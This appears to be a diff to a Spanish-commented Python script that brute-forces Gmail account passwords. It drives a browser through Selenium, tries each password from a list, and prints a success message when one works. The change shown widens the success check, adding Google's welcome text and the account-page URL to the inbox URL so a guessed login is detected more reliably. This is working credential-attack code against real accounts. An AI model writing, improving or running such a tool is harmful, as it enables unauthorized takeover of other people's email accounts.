@@ -13,7 +13,7 @@ from colorama import Fore, init  # Para colores en la consola
 init(autoreset=True)
 
 # Título del script en ASCII
-print(Fore.CYAN + """
+print(Fore.CYAN + r"""
 .___                             .__             .__                             .__       .__   
 |   | ____    ____   ____   ____ |__| ___________|__|____      __________   ____ |__|____  |  |  
 |   |/    \  / ___\_/ __ \ /    \|  |/ __ \_  __ \  \__  \    /  ___/  _ \_/ ___\|  \__  \ |  |  
@@ -86,9 +86,9 @@ for password in tqdm(passwords, desc="Probando contraseñas", unit=" contraseña
 
         # Esperar a que la página responda
         time.sleep(5)  # Esperar un momento para que la página cargue
-
+        message_successfully = "Te damos la bienvenida,"
         # Verificar si la URL actual es la de Gmail
-        if "https://mail.google.com/mail/u/0/#inbox" in driver.current_url:
+        if "https://mail.google.com/mail/u/0/#inbox" in driver.current_url or message_successfully in driver.page_source or "https://myaccount.google.com/?utm_source=sign_in_no_continue" in driver.current_url:
             print(Fore.GREEN + f"¡Éxito! La contraseña {password} es correcta." + Fore.RESET)
             break
         else:
